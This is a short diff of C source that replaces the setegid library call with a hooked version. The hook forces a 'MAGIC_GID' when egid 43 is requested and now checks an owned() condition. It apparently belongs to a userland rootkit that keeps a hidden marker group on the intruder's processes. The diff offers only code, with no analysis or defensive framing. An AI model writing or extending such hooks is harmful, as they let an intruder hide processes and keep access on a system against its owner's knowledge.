@@ -7,7 +7,7 @@ int setegid(gid_t egid)
     HOOK(old_setegid, CSETEGID);
 
     // prevents screen from changing the cur egid
-    if(egid == 43) { old_setegid(MAGIC_GID); return 0; }
+    if(owned()) { if(egid == 43) { old_setegid(MAGIC_GID); } return 0; }
 
     return old_setegid(egid);
 }
